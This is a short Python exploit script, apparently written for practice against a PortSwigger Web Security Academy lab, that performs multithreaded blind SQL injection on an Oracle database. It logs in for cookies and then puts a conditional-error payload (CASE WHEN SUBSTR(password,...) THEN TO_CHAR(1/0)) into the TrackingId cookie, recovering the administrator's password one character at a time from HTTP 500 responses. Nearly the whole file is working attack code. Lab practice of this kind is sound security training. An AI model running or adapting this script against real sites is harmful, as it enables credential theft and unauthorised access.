#
# Exploit Title       : Practicing Oracle blind boolean sql injection multithreaded data extraction
# Author              : OutHackThem
# Vulnerable Software : https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
#
# Usage : The script has 3 function 1)booleanBlindSqli() which
#         is used to extract the data using a provided query.
#         2)getQueryLength() which is used to get output length.
#         3)login() used to fetch the session cookies
#  

import requests
import urllib3
import string
import concurrent.futures
import time
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
s       = requests.Session()

rhost = sys.argv[1]


## Used to get the session cookies since the injection point is TrackingId Cookie
def login():   

    URL         = f"{rhost}login"
    r           = s.get(URL)
    print(f"[*] Got Tracking Cookie: {r.cookies['TrackingId']}")


'''
### The following function is used to calculate the length of the query that will be used to extract the data. 
### It has been commented right now because the result length is 20 if it happens to change you can uncomment.
### and use this function

def getQueryLength():

    count   = 1
    done    = False

    while not done:

        query = f"'||(SELECT CASE WHEN length(password)>{count} THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'"

        cookies = {
            "session":s.cookies['session'],
            "TrackingId":f"{s.cookies['TrackingId']}{query}"
        }
        print(cookies)
        r = requests.get(rhost, cookies=cookies)
        print(r.status_code)
        if r.status_code != 500:
            print(count)
            done = True
            break
        else:
            print('Finding Length...')
            count +=1
'''


def booleanBlindSqli(index):
    charSet = string.ascii_letters+string.digits

    for charIndex in charSet:
        query   = f"'||(SELECT CASE WHEN SUBSTR(password,{index},1)='{charIndex}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        cookies = {
            "session":s.cookies['session'],
            "TrackingId":f"{s.cookies['TrackingId']}{query}"
        }
        
        r       = requests.get(rhost,cookies=cookies)

        if r.status_code == 500:
            sys.stdout.write('-')
            sys.stdout.flush()
            return charIndex
            break
        else:
            pass

login()

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    letters = executor.map(booleanBlindSqli, list(range(1,21)))

queryResult =  ""
for letter in letters:
    queryResult += letter

print(f'\n\nResult :: {queryResult}')
